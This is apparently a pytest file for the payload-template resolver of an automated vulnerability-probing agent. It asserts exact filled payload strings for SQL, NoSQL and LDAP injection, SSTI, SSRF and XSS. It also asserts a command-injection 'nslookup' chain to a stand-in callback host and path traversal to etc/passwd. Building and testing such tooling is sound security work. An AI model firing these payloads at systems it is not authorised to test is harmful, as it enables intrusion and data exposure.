"""payload_ref → fireable template resolution (plan §9; Task 2b).

Asserts the resolver DoD:

  1. Coverage/consistency: every ``payload_ref`` in the base slice AND both corpus
     files resolves — no dead handles — and the resolver has no orphan template
     with no catalog entry. This is the regression guard that keeps ingest and
     resolver in sync.
  2. Slot filling produces the expected filled string for a sample of each class,
     with literal payload braces (Jinja ``{{...}}``, JSON ``{...}``) surviving.
  3. An unknown ref raises; a required-but-missing slot raises.
  4. Resolution is deterministic.

No live gate — resolution is pure string substitution, no firing, no oracle.
"""

from __future__ import annotations

import pytest

from reachagent.graph.nodes import SinkType
from reachagent.payloads import (
    MissingSlotError,
    PayloadLibrary,
    UnknownPayloadRefError,
    known_refs,
    load_corpus_entries,
    required_slots,
    resolve,
    resolve_entry,
)

# A full context kit — every slot the vocabulary defines, so any ref resolves.
# file_target is a real file path (path-traversal/LFI target), semantically
# distinct from any URL — the separation that fixes the {target} overload.
_KIT = {
    "nonce": "n1",
    "collab": "c.example",
    "canary": "CANARY42",
    "sleep": 5,
    "columns": "1,2,3",
    "predicate": "1=1",
    "pattern": ".*",
    "expr": "7*7",
    "file_target": "etc/passwd",
    "object_id": "2",
    "priv_field": "isAdmin",
}


def _all_catalog_refs() -> set[str]:
    refs = {e.payload_ref for e in PayloadLibrary.from_file().all_entries()}
    refs |= {e.payload_ref for e in load_corpus_entries()}
    return refs


# -- Invariant 1: coverage / consistency -------------------------------------


def test_every_base_and_corpus_ref_resolves() -> None:
    catalog = _all_catalog_refs()
    assert len(catalog) == 30  # base slice (7 unique) + corpus (23)
    for ref in catalog:
        # Resolving with the full kit must never raise for a catalogued ref.
        assert resolve(ref, **_KIT)


def test_no_orphan_templates() -> None:
    # Every template maps to a real catalog ref — no dead template with no entry.
    assert known_refs() == _all_catalog_refs()


def test_resolve_entry_bridges_get_payloads_to_string() -> None:
    lib = PayloadLibrary.from_file()

    entries = lib.get_payloads("sqli", SinkType.SQL)
    assert entries
    for e in entries:
        assert resolve_entry(e, **_KIT) == resolve(e.payload_ref, **_KIT)


# -- Invariant 2: slot filling, one sample per class family ------------------


@pytest.mark.parametrize(
    ("ref", "expected"),
    [
        ("patt/sqli/union/column-count-match", "' UNION SELECT 1,2,3-- -"),
        ("patt/sqli/blind/time-based-sleep", "' AND SLEEP(5)-- -"),
        ("patt/nosql/operator/ne-auth-bypass", '{"$ne":null}'),  # literal JSON braces survive
        ("patt/nosql/blind/regex-predicate-pair", '{"$regex":".*"}'),
        ("patt/ldap/filter/wildcard-always-true", "*)(objectClass=*)"),
        ("patt/cmdi/blind/oob-separator-chain", ";nslookup n1.c.example"),
        ("patt/ssti/polyglot/arithmetic-eval", "{{7*7}}"),  # literal Jinja braces survive
        ("patt/ssrf/blind/oob-fetch", "http://n1.c.example/"),
        ("patt/xss/reflected/img-onerror-canary", "<img src=x onerror=CANARY42>"),
        ("patt/path-traversal/dot-dot-slash", "../../../../etc/passwd"),
        ("seclists/fuzzing/lfi/encoded-traversal", "..%2f..%2f..%2f..%2fetc/passwd"),
        ("mass-assignment/admin-flag-injection", '{"isAdmin":true}'),
        ("xss/reflected/script-tag-canary", "<script>CANARY42</script>"),
    ],
)
def test_slot_filling_produces_expected_string(ref: str, expected: str) -> None:
    assert resolve(ref, **_KIT) == expected


def test_required_slots_reports_only_used_slots() -> None:
    # A template's required slots are exactly the vocabulary tokens it contains.
    assert required_slots("patt/sqli/union/column-count-match") == {"columns"}
    assert required_slots("patt/cmdi/blind/oob-separator-chain") == {"nonce", "collab"}
    assert required_slots("patt/sqli/error-based/quote-break") == frozenset()


def test_extra_slots_are_ignored() -> None:
    # Passing the full kit to a slot-less ref is fine — extras are ignored.
    assert resolve("patt/sqli/error-based/quote-break", **_KIT) == "'"


# -- Invariant 3: loud failures ----------------------------------------------


def test_unknown_ref_raises() -> None:
    with pytest.raises(UnknownPayloadRefError):
        resolve("patt/not/a/real/ref", **_KIT)


def test_required_slots_unknown_ref_raises() -> None:
    with pytest.raises(UnknownPayloadRefError):
        required_slots("patt/not/a/real/ref")


def test_missing_required_slot_raises() -> None:
    # time-based-sleep needs {sleep}; omitting it is a loud error, not "SLEEP()".
    with pytest.raises(MissingSlotError):
        resolve("patt/sqli/blind/time-based-sleep")


def test_none_slot_value_counts_as_missing() -> None:
    with pytest.raises(MissingSlotError):
        resolve("patt/sqli/blind/time-based-sleep", sleep=None)


# -- Invariant 4: determinism ------------------------------------------------


def test_resolution_is_deterministic() -> None:
    for ref in _all_catalog_refs():
        assert resolve(ref, **_KIT) == resolve(ref, **_KIT)


# -- Invariant 5: value/location decoupling (Nuclei-style) -------------------


def test_resolver_produces_value_only_never_location() -> None:
    # The resolved payload is the parameter VALUE only. Location (query/body/path/
    # header) lives on the graph Parameter and is applied by _fire_with_value, so a
    # template must not encode placement: no leading key=value binding, no query
    # assembly ('?'/'&'), no header framing (': '), no URL scheme except where the
    # value itself IS a URL (SSRF), which is a legitimate value, not a location.
    url_valued = {"patt/ssrf/blind/oob-fetch"}
    for ref in _all_catalog_refs():
        value = resolve(ref, **_KIT)
        assert not value.startswith("?")
        assert "&" not in value
        assert ": " not in value  # no "Header: value" framing baked in
        # No "key=value" parameter binding prefix (a bare '=' inside SQL like
        # '1'='1' is fine; a leading "name=" assignment is not).
        assert not _looks_like_param_binding(value)
        if ref not in url_valued:
            assert "http://" not in value and "https://" not in value


def _looks_like_param_binding(value: str) -> bool:
    """True if the value starts with an ``ident=`` binding (a location artifact)."""
    head = value.split("=", 1)[0]
    return "=" in value and head.isidentifier() and len(head) > 0


# -- Invariant 6: semantic validity per sink class ---------------------------
#
# The guard that would have caught the {target} overload: resolve every base +
# corpus entry with a realistic kit and assert the value is plausible for its
# vuln_class's SINK (taken from the catalog, so this generalises to the next
# overloaded-slot mistake — it is not a one-off check of the two LFI refs).


def _catalog_entries() -> list:
    base = list(PayloadLibrary.from_file().all_entries())
    return base + list(load_corpus_entries())


def _has_url(value: str) -> bool:
    return "http://" in value or "https://" in value


def test_resolved_value_is_semantically_valid_for_its_sink() -> None:
    for entry in _catalog_entries():
        sink = entry.inferred_sink_type
        sink_name = sink.value if sink is not None else None
        value = resolve(entry.payload_ref, **_KIT)
        ref = entry.payload_ref

        if sink_name == "file_path":
            # A traversal payload: has a ../ or ..%2f sequence and is NOT a URL.
            assert ("../" in value) or ("..%2f" in value.lower()), ref
            assert not _has_url(value), ref  # the bug: file_path must not be a URL

        elif sink_name == "sql":
            # Contains a SQL metacharacter or keyword.
            upper = value.upper()
            assert (
                ("'" in value)
                or ("UNION" in upper)
                or ("SLEEP" in upper)
                or (" OR " in upper)
                or (" AND " in upper)
            ), ref

        elif sink_name == "html_reflection":
            # A markup payload carrying the execution-confirmation canary.
            assert "<" in value, ref
            assert _KIT["canary"] in value, ref

        elif sink_name == "url":
            # SSRF: the value itself IS a URL.
            assert _has_url(value), ref

        elif sink_name == "nosql":
            # A Mongo query operator.
            assert ("$ne" in value) or ("$regex" in value) or ("$gt" in value), ref

        elif sink_name == "template":
            # SSTI: the arithmetic expression the engine evaluates.
            assert _KIT["expr"] in value, ref

        elif sink_name == "ldap":
            # An LDAP filter fragment.
            assert ("(" in value) or ("*" in value), ref

        elif sink_name == "shell":
            # A command separator chaining an OOB lookup.
            assert (";" in value) or ("|" in value) or ("`" in value), ref


def test_file_target_defaults_to_etc_passwd_with_no_kit() -> None:
    # file_target has a default, so path-traversal/LFI require no slot at all and
    # resolve to a canonical read-only target rather than raising.
    assert required_slots("patt/path-traversal/dot-dot-slash") == frozenset()
    assert required_slots("seclists/fuzzing/lfi/encoded-traversal") == frozenset()
    assert resolve("patt/path-traversal/dot-dot-slash") == "../../../../etc/passwd"
    assert resolve("seclists/fuzzing/lfi/encoded-traversal") == "..%2f..%2f..%2f..%2fetc/passwd"


def test_file_target_override_is_honored() -> None:
    assert (
        resolve("patt/path-traversal/dot-dot-slash", file_target="windows/win.ini")
        == "../../../../windows/win.ini"
    )
